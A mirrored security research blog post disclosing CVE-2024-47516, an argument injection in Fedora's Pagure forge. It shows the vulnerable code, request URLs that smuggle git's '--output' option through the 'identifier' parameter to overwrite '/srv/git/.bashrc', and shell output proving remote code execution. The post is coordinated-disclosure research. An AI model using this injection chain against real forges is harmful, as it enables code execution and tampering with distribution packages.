<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://fenrisk.com/pagure">Original</a>
    <h1>Supply Chain Attacks on Linux Distributions – Fedora Pagure</h1>
    
    <div id="readability-page-1" class="page"><div>
               



<h5><u>Why Pagure?</u></h5>

<p>As discussed in the meta-article, we picked Pagure from the <a href="https://apps.fedoraproject.org">Fedora Apps Directory</a> and already had a technical approach in mind. A software forge is likely to be a good target for an argument injection: we can expect the backend to shell out even when <code>libgit2</code> bindings are used.</p>

<p>In addition, this is a self-service application, in the sense that anyone can create a Fedora <a href="https://accounts.fedoraproject.org">contributor account</a> and gain authenticated access to various services. For instance, this allows users to report packaging issues and contribute back directly on Pagure.</p>

<p><img src="https://fenrisk.com/assets/images/art/pagure-1.png"/></p>

<p>Fedora packages are made of several text files, for instance <a href="https://src.fedoraproject.org/rpms/openssh">in the case of OpenSSH</a>:
</p><ul>
<li>A spec file, describing upstream sources, dependencies, build steps, patches to apply, e.g. <a href="https://src.fedoraproject.org/rpms/openssh/blob/rawhide/f/openssh.spec"><code>openssh.spec</code></a>.</li>
<li>Sources files to declare the expected checksums and GPG signatures of the source archives, e.g. <a href="https://src.fedoraproject.org/rpms/openssh/blob/rawhide/f/sources"><code>sources</code></a>.</li>
<li>Patch files, e.g. <a href="https://src.fedoraproject.org/rpms/openssh/c/03a941c07910cec7cff8b955f0b31fdc8177c23e?branch=rawhide">cherry-picked security fixes</a>.</li>
<li>Systemd unit files, e.g. <a href="https://src.fedoraproject.org/rpms/openssh/blob/rawhide/f/sshd.service"><code>sshd.service</code></a>.</li>
</ul>

<p>While the <code>sources</code> file allows validating the integrity of upstream code, attackers modifying any other file could easily sneak in malicious code.</p>

<h5><u>Our findings</u></h5>

<p>Our effort resulted in CVE-2024-47516, an argument injection in <code>PagureRepo.log()</code>. It allows writing to arbitrary files, allowing the execution of arbitrary code on any Pagure instance. We could confirm the vulnerability both on our (painfully broken) local instance and the Fedora staging server with their permission after our initial report.</p>

<p>We also uncovered 3 other vulnerabilities that we won’t be detailing in this article—feel free to try to PoC them based on their CVEs. The first one is a classic path traversal, while the two others are related to the way Pagure deals with repository files, and all lead to RCE as well:</p>

<ul>
<li>CVE-2024-4982: Path traversal in <code>view_issue_raw_file()</code></li>
<li>CVE-2024-4981: <code>_update_file_in_git()</code> follows symbolic links in temporary clones</li>
<li>CVE-2024-47515: <code>generate_archive()</code> follows symbolic links in temporary clones</li>
</ul>

<p>These bugs would have allowed us to modify any of the repositories stored on Pagure and thus the specification of any Fedora package to change its upstream sources, scripts or distribution patches. Quite a nice impact for such simple bugs eh?</p>

<h5><u>CVE-2024-47516: Argument Injection in PagureRepo.log()</u></h5>

<p>As we expected, <code>strace</code> and a quick manual bottom-up code review reveal many calls to the <code>git</code> binary, despite Python bindings around <code>libgit2</code> being available in the project. </p>

<p>In the snippet below, note the docstring explaining why Python bindings are not used, and the presence of <code>--</code> in the command line. This is not the <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html">POSIX <code>end-of-options</code> switch</a> but a separator specific to Git to differentiate references and paths, and while Git’s <code>--end-of-options</code> should have been used, only <code>log_options</code> and fromref will be injectable here.</p>

<p><b>lib/repo.py</b></p>

<figure><pre><code data-lang="python"><span></span><span>@staticmethod</span>
<span>def</span> <span>log</span><span>(</span><span>path</span><span>,</span> <span>log_options</span><span>=</span><span>None</span><span>,</span> <span>target</span><span>=</span><span>None</span><span>,</span> <span>fromref</span><span>=</span><span>None</span><span>):</span>
<span>   </span><span>&#34;&#34;&#34;Run git log with the specified options at the specified target.</span>


<span>   This method runs the system&#39;s `git log` command since pygit2 doesn&#39;t</span>
<span>   offer us the possibility to do this via them. [...]</span>
<span>   &#34;&#34;&#34;</span>
   <span>cmd</span> <span>=</span> <span>[</span><span>&#34;git&#34;</span><span>,</span> <span>&#34;log&#34;</span><span>]</span>
   <span>if</span> <span>log_options</span><span>:</span>
       <span>cmd</span><span>.</span><span>extend</span><span>(</span><span>log_options</span><span>)</span>
   <span>if</span> <span>fromref</span><span>:</span>
       <span>cmd</span><span>.</span><span>append</span><span>(</span><span>fromref</span><span>)</span>
   <span>if</span> <span>target</span><span>:</span>
       <span>cmd</span><span>.</span><span>extend</span><span>([</span><span>&#34;--&#34;</span><span>,</span> <span>target</span><span>])</span>


   <span>return</span> <span>run_command</span><span>(</span><span>cmd</span><span>,</span> <span>cwd</span><span>=</span><span>path</span><span>)</span></code></pre></figure>

<p>There’s only one cross-reference for this function, in which it is clear that fromref is tainted by the query parameter <code>identifier</code>:</p>

<p><b>lib/repo.py</b></p>

<figure><pre><code data-lang="python"><span></span><span>@UI_NS</span><span>.</span><span>route</span><span>(</span><span>&#34;/&lt;repo&gt;/history/&lt;path:filename&gt;&#34;</span><span>)</span>
<span>@UI_NS</span><span>.</span><span>route</span><span>(</span><span>&#34;/&lt;namespace&gt;/&lt;repo&gt;/history/&lt;path:filename&gt;&#34;</span><span>)</span>
<span># [...]</span>
<span>def</span> <span>view_history_file</span><span>(</span><span>repo</span><span>,</span> <span>filename</span><span>,</span> <span>username</span><span>=</span><span>None</span><span>,</span> <span>namespace</span><span>=</span><span>None</span><span>):</span>
   <span># [...]</span>
   <span>branchname</span> <span>=</span> <span>flask</span><span>.</span><span>request</span><span>.</span><span>args</span><span>.</span><span>get</span><span>(</span><span>&#34;identifier&#34;</span><span>)</span>
   <span>if</span> <span>repo_obj</span><span>.</span><span>is_empty</span><span>:</span>
       <span>flask</span><span>.</span><span>abort</span><span>(</span><span>404</span><span>,</span> <span>description</span><span>=</span><span>&#34;Empty repo cannot have a file&#34;</span><span>)</span>
   <span># [...]</span>
   <span>try</span><span>:</span>
       <span>log</span> <span>=</span> <span>pagure</span><span>.</span><span>lib</span><span>.</span><span>repo</span><span>.</span><span>PagureRepo</span><span>.</span><span>log</span><span>(</span>
           <span>flask</span><span>.</span><span>g</span><span>.</span><span>reponame</span><span>,</span>
           <span>log_options</span><span>=</span><span>[</span><span>&#34;--pretty=oneline&#34;</span><span>,</span> <span>&#34;--abbrev-commit&#34;</span><span>],</span>
           <span>target</span><span>=</span><span>filename</span><span>,</span>
           <span>fromref</span><span>=</span><span>branchname</span><span>,</span>
       <span>)</span>
   <span># [...]</span></code></pre></figure>

<p>Through <code>identifier</code>, we can inject the option-argument <code>--output</code> to git log to create a new file, or replace an existing one if permissions allow. It will contain a copy of the Git history of the file pointed by <code>filename</code>.</p>

<figure><pre><code data-lang="python"><span></span><span>$</span> <span>man</span> <span>git</span><span>-</span><span>log</span>
<span>NAME</span>
      <span>git</span><span>-</span><span>log</span> <span>-</span> <span>Show</span> <span>commit</span> <span>logs</span>
<span>...</span><span>skipping</span><span>...</span>
      <span>--</span><span>output</span><span>=&lt;</span><span>file</span><span>&gt;</span>
          <span>Output</span> <span>to</span> <span>a</span> <span>specific</span> <span>file</span> <span>instead</span> <span>of</span> <span>stdout</span><span>.</span></code></pre></figure>

<p>For instance, by sending a request to <code>http://pagure.local/test/history/README.md?identifier=--output=/tmp/foo.bar</code>, it creates the file as follows with the history of the file <code>README.md</code>:</p>

<center><img src="https://fenrisk.com/assets/images/art/pagure-2.png"/></center>

<h5><u>The theory</u></h5>

<p>This is a powerful primitive, and the mandatory prefix (the short Git commit identifier) will likely not be a big hurdle if we target scripts rather than configuration files. For instance, with Python script, we can start the commit message with a colon and then add arbitrary code, as long as the commit identifier doesn’t start with a digit. </p>

<p>We also noticed that asking for the history of a non-existent file works, and will only result in an empty file. If the destination file exists, it will be truncated.</p>

<p>Because triggering the injection doesn’t require an account on the Pagure instance, we started thinking about what could be truncated or replaced with the history of a repository that was not under our control, like Git hooks or configuration files. </p>

<p>But again, this is a self-service application on which we can create an account freely and have our own repository (and commit history), so why bother!</p>

<p>For instance, we already know that <a href="https://www.sonarsource.com/blog/empowering-weak-primitives-file-truncation-to-code-execution-with-git/">Git repositories can be interesting when we have the ability to truncate arbitrary files</a>, but this wouldn’t work here because Pagure stores them as bare repositories. If we tried to race the edition of a repository via the web UI, we would still need to guess / find the name of the temporary folder. </p>

<p>We could also be overriding Python files of the application. It worked locally on a Pagure deployed from source, but when validating the finding on the staging instance, we noticed that this idea and a few other ones simply didn’t work! The instance must have been deployed from the Fedora RPM packages where application files are owned by <code>root</code>. </p>

<h5><u>The reality</u></h5>

<p>We need to find other target files to overwrite, where the mandatory prefix will hopefully not break anything. We can’t touch Pagure code and will need to fall back to a configuration file or data it stores: we picked the custom authentication system behind <code>OpenSSH</code>.</p>

<p>Ever wondered how GitHub, GitLab, and others let all users authenticate as git over SSH? In our case, Pagure configures sshd to call <code>keyhelper.py</code> at every connection, with any SSH key via <a href="https://man.openbsd.org/sshd_config"><code>AuthorizedKeysCommand</code></a>. OpenSSH automatically passes the information about the current system user (git and its home, <code>/srv/git/</code>), the key type, and its fingerprint for use by <code>keyhelper.py</code>. </p>

<p><b>/etc/ssh/sshd_config</b></p>

<figure><pre><code data-lang="python"><span></span><span>Match</span> <span>User</span> <span>git</span>
   <span>AuthorizedKeysCommand</span> <span>/</span><span>usr</span><span>/</span><span>libexec</span><span>/</span><span>pagure</span><span>/</span><span>keyhelper</span><span>.</span><span>py</span> <span>&#34;</span><span>%u</span><span>&#34;</span> <span>&#34;%h&#34;</span> <span>&#34;%t&#34;</span> <span>&#34;</span><span>%f</span><span>&#34;</span>
   <span>AuthorizedKeysCommandUser</span> <span>git</span></code></pre></figure>

<p>At this point, the user is still not authenticated by SSH, and <code>keyhelper.py</code> needs to identify if a Pagure account has this key in their account settings. </p>

<p><b>/usr/libexec/pagure/keyhelper.py</b></p>

<figure><pre><code data-lang="python"><span></span><span># [...]</span>
<span>username</span><span>,</span> <span>userhome</span><span>,</span> <span>keytype</span><span>,</span> <span>fingerprint</span> <span>=</span> <span>sys</span><span>.</span><span>argv</span><span>[</span><span>1</span><span>:</span><span>5</span><span>]</span>
<span># [...]</span>
<span>pagure_url</span> <span>=</span> <span>pagure_config</span><span>[</span><span>&#34;APP_URL&#34;</span><span>]</span><span>.</span><span>rstrip</span><span>(</span><span>&#34;/&#34;</span><span>)</span>
<span>url</span> <span>=</span> <span>&#34;</span><span>%s</span><span>/pv/ssh/lookupkey/&#34;</span> <span>%</span> <span>pagure_url</span>
<span>data</span> <span>=</span> <span>{</span><span>&#34;search_key&#34;</span><span>:</span> <span>fingerprint</span><span>}</span>
<span># [...]</span>
<span>headers</span> <span>=</span> <span>{}</span>
<span>if</span> <span>pagure_config</span><span>.</span><span>get</span><span>(</span><span>&#34;SSH_ADMIN_TOKEN&#34;</span><span>):</span>
   <span>headers</span><span>[</span><span>&#34;Authorization&#34;</span><span>]</span> <span>=</span> <span>&#34;token </span><span>%s</span><span>&#34;</span> <span>%</span> <span>pagure_config</span><span>[</span><span>&#34;SSH_ADMIN_TOKEN&#34;</span><span>]</span>
<span>resp</span> <span>=</span> <span>requests</span><span>.</span><span>post</span><span>(</span><span>url</span><span>,</span> <span>data</span><span>=</span><span>data</span><span>,</span> <span>headers</span><span>=</span><span>headers</span><span>,</span> <span>verify</span><span>=</span><span>False</span><span>)</span>
<span>if</span> <span>not</span> <span>resp</span><span>.</span><span>status_code</span> <span>==</span> <span>200</span><span>:</span>
   <span>print</span><span>(</span>
       <span>&#34;Error during lookup request: status: </span><span>%s</span><span>&#34;</span> <span>%</span> <span>resp</span><span>.</span><span>status_code</span><span>,</span>
       <span>file</span><span>=</span><span>sys</span><span>.</span><span>stderr</span><span>,</span>
   <span>)</span>
   <span>print</span><span>(</span><span>resp</span><span>.</span><span>text</span><span>)</span>
   <span>sys</span><span>.</span><span>exit</span><span>(</span><span>1</span><span>)</span>

<span>result</span> <span>=</span> <span>resp</span><span>.</span><span>json</span><span>()</span>

<span>if</span> <span>not</span> <span>result</span><span>[</span><span>&#34;found&#34;</span><span>]:</span>
   <span># Everything OK, key just didn&#39;t exist.</span>
   <span>sys</span><span>.</span><span>exit</span><span>(</span><span>0</span><span>)</span>

<span>print</span><span>(</span>
   <span>&#34;</span><span>%s</span><span> </span><span>%s</span><span>&#34;</span>
   <span>%</span> <span>(</span><span>pagure_config</span><span>[</span><span>&#34;SSH_KEYS_OPTIONS&#34;</span><span>]</span> <span>%</span> <span>result</span><span>,</span> <span>result</span><span>[</span><span>&#34;public_key&#34;</span><span>])</span>
<span>)</span></code></pre></figure>

<p>It returns a line in the <a href="https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT"><code>AuthorizedKeys</code></a> format, with <code>SSH_KEYS_OPTIONS</code> set to <code>restrict,command=&#34;/usr/libexec/pagure/aclchecker.py %(username)s&#34;</code> if the public key is known. <code>restrict</code> forbids features like port forwarding and the execution of files like <code>~/.ssh/rc</code> (it would have been a good target for us!), while command forces the execution of <code>aclchecker.py</code>.</p>

<p>This script finally takes the SSH command the user intends to execute, makes sure it is a Git fetch one (<code>git-receive-pack, git-upload-pack</code>), and executes it:</p>

<p><b>/usr/libexec/pagure/aclchecker.py</b></p>

<figure><pre><code data-lang="python"><span></span><span>if</span> <span>&#34;SSH_ORIGINAL_COMMAND&#34;</span> <span>not</span> <span>in</span> <span>os</span><span>.</span><span>environ</span><span>:</span>
   <span>print</span><span>(</span><span>&#34;Welcome </span><span>%s</span><span>. This server does not offer shell access.&#34;</span> <span>%</span> <span>sys</span><span>.</span><span>argv</span><span>[</span><span>1</span><span>])</span>
   <span>sys</span><span>.</span><span>exit</span><span>(</span><span>0</span><span>)</span>
<span># [...]</span>
<span>args</span> <span>=</span> <span>os</span><span>.</span><span>environ</span><span>[</span><span>&#34;SSH_ORIGINAL_COMMAND&#34;</span><span>]</span><span>.</span><span>split</span><span>(</span><span>&#34; &#34;</span><span>)</span>
<span># Expects: &lt;git-(receive|upload)-pack&gt; &lt;repopath&gt;</span>
<span>if</span> <span>len</span><span>(</span><span>args</span><span>)</span> <span>!=</span> <span>2</span><span>:</span>
   <span>print</span><span>(</span><span>&#34;Invalid call, too few inner arguments&#34;</span><span>,</span> <span>file</span><span>=</span><span>sys</span><span>.</span><span>stderr</span><span>)</span>
   <span>sys</span><span>.</span><span>exit</span><span>(</span><span>1</span><span>)</span>

<span>cmd</span> <span>=</span> <span>args</span><span>[</span><span>0</span><span>]</span>
<span>gitdir</span> <span>=</span> <span>args</span><span>[</span><span>1</span><span>]</span>
<span>if</span> <span>cmd</span> <span>not</span> <span>in</span> <span>(</span><span>&#34;git-receive-pack&#34;</span><span>,</span> <span>&#34;git-upload-pack&#34;</span><span>):</span>
   <span>print</span><span>(</span><span>&#34;Invalid call, invalid operation&#34;</span><span>,</span> <span>file</span><span>=</span><span>sys</span><span>.</span><span>stderr</span><span>)</span>
   <span>sys</span><span>.</span><span>exit</span><span>(</span><span>1</span><span>)</span>
<span># [...]</span>
<span>runargs</span> <span>=</span> <span>[</span><span>arg</span> <span>%</span> <span>result</span> <span>for</span> <span>arg</span> <span>in</span> <span>runner</span><span>]</span>
<span>if</span> <span>env</span><span>:</span>
   <span>for</span> <span>key</span> <span>in</span> <span>env</span><span>:</span>
       <span>os</span><span>.</span><span>environ</span><span>[</span><span>key</span><span>]</span> <span>=</span> <span>env</span><span>[</span><span>key</span><span>]</span> <span>%</span> <span>result</span>
<span>os</span><span>.</span><span>execvp</span><span>(</span><span>runargs</span><span>[</span><span>0</span><span>],</span> <span>runargs</span><span>)</span></code></pre></figure>

<p>Indeed, trying to connect to the server through SSH and requesting a shell will correctly authenticate us, but show us an error because we’re not asking to perform any of these Git operations:</p>

<figure><pre><code data-lang="python"><span></span><span>thomas</span><span>@foobar</span> <span>~</span> <span>%</span> <span>ssh</span> <span>git</span><span>@pagure</span><span>.</span><span>local</span>
<span>PTY</span> <span>allocation</span> <span>request</span> <span>failed</span> <span>on</span> <span>channel</span> <span>0</span>
<span>Welcome</span> <span>thomas</span><span>.</span> <span>This</span> <span>server</span> <span>does</span> <span>not</span> <span>offer</span> <span>shell</span> <span>access</span><span>.</span>
<span>Connection</span> <span>to</span> <span>pagure</span><span>.</span><span>local</span> <span>closed</span><span>.</span></code></pre></figure>

<p>Let’s run a strace of this whole process during a <code>git clone—notice</code> anything interesting?</p>

<figure><pre><code data-lang="emacs"><span></span><span>[</span><span>pid</span><span>  </span><span>3817</span><span>]</span><span> </span><span>execve</span><span>(</span><span>&#34;/usr/libexec/pagure/keyhelper.py&#34;</span><span>,</span><span> </span><span>[</span><span>&#34;/usr/libexec/pagure/keyhelper.py&#34;</span><span>,</span><span> </span><span>&#34;git&#34;</span><span>,</span><span> </span><span>&#34;/srv/git&#34;</span><span>,</span><span> </span><span>&#34;ssh-ed25519&#34;</span><span>,</span><span> </span><span>&#34;SHA256:GgKi0ddkGVKnfUzd8kwjxIM9e&#34;</span><span>..</span>
<span>.</span><span>]</span><span>,</span><span> </span><span>[</span><span>&#34;PATH=/usr/local/bin:/usr/bin:/us&#34;</span><span>...,</span><span> </span><span>&#34;USER=git&#34;</span><span>,</span><span> </span><span>&#34;LOGNAME=git&#34;</span><span>,</span><span> </span><span>&#34;HOME=/srv/git&#34;</span><span>,</span><span> </span><span>&#34;LANG=en_US.UTF-8&#34;</span><span>])</span><span> </span><span>=</span><span> </span><span>0</span>
<span>[</span><span>...</span><span>]</span>
<span>[</span><span>pid</span><span>  </span><span>3834</span><span>]</span><span> </span><span>execve</span><span>(</span><span>&#34;/bin/bash&#34;</span><span>,</span><span> </span><span>[</span><span>&#34;bash&#34;</span><span>,</span><span> </span><span>&#34;-c&#34;</span><span>,</span><span> </span><span>&#34;/usr/libexec/pagure/aclchecker.p&#34;</span><span>...</span><span>]</span><span>,</span><span> </span><span>[</span><span>&#34;USER=git&#34;</span><span>,</span><span> </span><span>&#34;LOGNAME=git&#34;</span><span>,</span><span> </span><span>&#34;HOME=/srv/git&#34;</span><span>,</span><span> </span><span>&#34;PATH=/usr/local/bin:/usr/bin:</span>
<span>/us&#34;</span><span>...,</span><span> </span><span>&#34;SHELL=/bin/bash&#34;</span><span>,</span><span> </span><span>&#34;MOTD_SHOWN=pam&#34;</span><span>,</span><span> </span><span>&#34;XDG_SESSION_ID=71&#34;</span><span>,</span><span> </span><span>&#34;XDG_RUNTIME_DIR=/run/user/1001&#34;</span><span>,</span><span> </span><span>&#34;DBUS_SESSION_BUS_ADDRESS=unix:pa&#34;</span><span>...,</span><span> </span><span>&#34;XDG_SESSION_TYPE=tty&#34;</span>
<span>,</span><span> </span><span>&#34;XDG_SESSION_CLASS=user&#34;</span><span>,</span><span> </span><span>&#34;SSH_CLIENT=192.168.77.1 56903 22&#34;</span><span>,</span><span> </span><span>&#34;SSH_CONNECTION=192.168.77.1 5690&#34;</span><span>...,</span><span> </span><span>&#34;SSH_ORIGINAL_COMMAND=git-upload-&#34;</span><span>...</span><span>])</span><span> </span><span>=</span><span> </span><span>0</span>
<span>#</span><span> </span><span>[</span><span>...</span><span>]</span>
<span>[</span><span>pid</span><span>  </span><span>3834</span><span>]</span><span> </span><span>openat</span><span>(</span><span>AT_FDCWD&lt;/srv/git&gt;,</span><span> </span><span>&#34;/srv/git/.bashrc&#34;</span><span>,</span><span> </span><span>O_RDONLY</span><span>)</span><span> </span><span>=</span><span> </span><span>-1</span><span> </span><span>ENOENT</span><span> </span><span>(</span><span>No</span><span> </span><span>such</span><span> </span><span>file</span><span> </span><span>or</span><span> </span><span>directory</span><span>)</span>
<span>[</span><span>pid</span><span>  </span><span>3834</span><span>]</span><span> </span><span>execve</span><span>(</span><span>&#34;/usr/libexec/pagure/aclchecker.py&#34;</span><span>,</span><span> </span><span>[</span><span>&#34;/usr/libexec/pagure/aclchecker.p&#34;</span><span>...,</span><span> </span><span>&#34;thomas&#34;</span><span>]</span><span>,</span><span> </span><span>[</span><span>&#34;SHELL=/bin/bash&#34;</span><span>,</span><span> </span><span>&#34;PWD=/srv/git&#34;</span><span>,</span><span> </span><span>&#34;LOGNAME=git&#34;</span><span>,</span><span> </span><span>&#34;XDG</span>
<span>_SESSION_TYPE=tty&#34;</span><span>,</span><span> </span><span>&#34;MOTD_SHOWN=pam&#34;</span><span>,</span><span> </span><span>&#34;HOME=/srv/git&#34;</span><span>,</span><span> </span><span>&#34;SSH_ORIGINAL_COMMAND=git-upload-&#34;</span><span>...,</span><span> </span><span>&#34;SSH_CONNECTION=192.168.77.1 5690&#34;</span><span>...,</span><span> </span><span>&#34;XDG_SESSION_CLASS=user&#34;</span><span>,</span><span> </span><span>&#34;US</span>
<span>ER=git&#34;</span><span>,</span><span> </span><span>&#34;SHLVL=0&#34;</span><span>,</span><span> </span><span>&#34;XDG_SESSION_ID=71&#34;</span><span>,</span><span> </span><span>&#34;XDG_RUNTIME_DIR=/run/user/1001&#34;</span><span>,</span><span> </span><span>&#34;SSH_CLIENT=192.168.77.1 56903 22&#34;</span><span>,</span><span> </span><span>&#34;PATH=/usr/local/bin:/usr/bin:/us&#34;</span><span>...,</span><span> </span><span>&#34;DBUS_SESSIO</span>
<span>N_BUS_ADDRESS=unix:pa&#34;</span><span>...,</span><span> </span><span>&#34;=/usr/libexec/pagure/aclchecker&#34;</span><span>...</span><span>])</span><span> </span><span>=</span><span> </span><span>0</span>
<span>#</span><span> </span><span>[</span><span>...</span><span>]</span></code></pre></figure>

<p>The command directive is executed with the user’s shell bash, so it tried loading their <code>.bashrc</code>! </p>

<p>This may sound strange for this user to have a shell, but this is actually required for this system to work: they need to execute the Python scripts with several arguments to authentify the Pagure user, and because all users connect as <code>git</code>, these scripts are responsible for authorizations checks too. It sounds very reasonable for SSH to use the user’s shell to execute this forced command.</p>

<p>We can’t change git’s shell to <code>/sbin/nologin</code> or <code>/bin/false</code>, or users wouldn’t be able to connect over SSH. </p>

<p><i>(The platform sourcehut uses a similar model, we strongly suggest reading <a href="http://git.sr.ht">What happens when you push to git.sr.ht, and why was it so slow?</a> to learn more about this implementation).</i></p>

<p>Back to our case: we only have to override <code>git</code>’s <code>.bashrc</code> and we will obtain a proper shell before the execution of the script <code>aclchecker.py</code>. As shown earlier, we will first need to create our repository and send a request to http://pagure.local/test/history/README.md?identifier=<code>--output=/srv/git/.bashrc</code>.</p>

<p>Bash is quite permissive so the mandatory prefix will not be an issue, we can use the operator <code>||</code> to execute another command as the first one will not be found:</p>

<center><img src="https://fenrisk.com/assets/images/art/pagure-3.png"/></center>

<p>This is what it looks like after exploiting the argument injection to override <code>/srv/git/.bashrc</code>: any Pagure user will obtain a shell.</p>

<figure><pre><code data-lang="emacs"><span></span><span>thomas@foobar</span><span> </span><span>~</span><span> </span><span>%</span><span> </span><span>ssh</span><span> </span><span>git@pagure.local</span>
<span>PTY</span><span> </span><span>allocation</span><span> </span><span>request</span><span> </span><span>failed</span><span> </span><span>on</span><span> </span><span>channel</span><span> </span><span>0</span>
<span>/srv/git/.bashrc:</span><span> </span><span>line</span><span> </span><span>1:</span><span> </span><span>cc75d10:</span><span> </span><span>command</span><span> </span><span>not</span><span> </span><span>found</span>
<span>uname</span><span> </span><span>-a</span>
<span>Linux</span><span> </span><span>pagure.local</span><span> </span><span>6.8.9-100.fc38.aarch64</span><span> </span><span>#</span><span>1</span><span> </span><span>SMP</span><span> </span><span>PREEMPT_DYNAMIC</span><span> </span><span>Thu</span><span> </span><span>May</span><span>  </span><span>2</span><span> </span><span>19:13:01</span><span> </span><span>UTC</span><span> </span><span>2024</span><span> </span><span>aarch64</span><span> </span><span>GNU/Linux</span>
<span>id</span>
<span>uid=1001</span><span>(</span><span>git</span><span>)</span><span> </span><span>gid=1001</span><span>(</span><span>git</span><span>)</span><span> </span><span>groups=1001</span><span>(</span><span>git</span><span>)</span>
<span>/srv/git/.bashrc:</span><span> </span><span>line</span><span> </span><span>2:</span><span> </span><span>573f846:</span><span> </span><span>command</span><span> </span><span>not</span><span> </span><span>found</span>
<span>Welcome</span><span> </span><span>thomas.</span><span> </span><span>This</span><span> </span><span>server</span><span> </span><span>does</span><span> </span><span>not</span><span> </span><span>offer</span><span> </span><span>shell</span><span> </span><span>access.</span>
<span>Connection</span><span> </span><span>to</span><span> </span><span>pagure.local</span><span> </span><span>closed.</span></code></pre></figure>

<p><iframe src="https://player.vimeo.com/video/1066145210?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479" frameborder="0" allow="autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media" title="Pagure"></iframe></p>

<h5><u>Disclosure</u></h5>

<p>We disclosed this vulnerability to Pagure maintainers via <a href="https://bugzilla.redhat.com">Red Hat’s Bugzilla</a> on April 2024, and it was promptly patched on production systems a few hours later (!!). We then stayed in the loop and reviewed the patches before the official <a href="https://pagure.io/pagure/releases">release of Pagure 5.14.1</a> in May along with our other reports.</p>

<p>We should note these are all one-off fixes that don’t really address the deeper root cause. There are still a bunch of external git invocations rather than calls to <code>libgit2</code>, but at least we are satisfied with the patches of the specific vulnerabilities we reported.</p>

<p><a href="https://communityblog.fedoraproject.org/fedora-chooses-forgejo/">In a decision unrelated to our work</a>, Fedora decided to migrate from Pagure to Forgejo, a fork of Gitea. We can only welcome this change from a security standpoint, as Forgejo benefits from an active community. It went a long way from Gogs—where Thomas basically found basically the <a href="https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-2/">same vulnerabilities</a>—and avoids a GitLab monoculture. We were only surprised by Forjero’s security track record and <a href="https://github.com/advisories?query=forgejo">their 3 CVEs</a> in total. Instead, they publish <a href="https://codeberg.org/forgejo/security-announcements/issues">short advisories on their bug tracker</a> when a new security release is out.</p>

<h5><u>Conclusion</u></h5>

<p>Overall, this is a very simple bug that was only made technically interesting because of the little exploitation twist and its huge impact. The migration to Forgejo will hopefully make Fedora’s package hosting platform less of an easy target and reduce the likelihood of such supply chain attacks.</p>

              
              
              
              
              
            </div></div>
  </body>
</html>
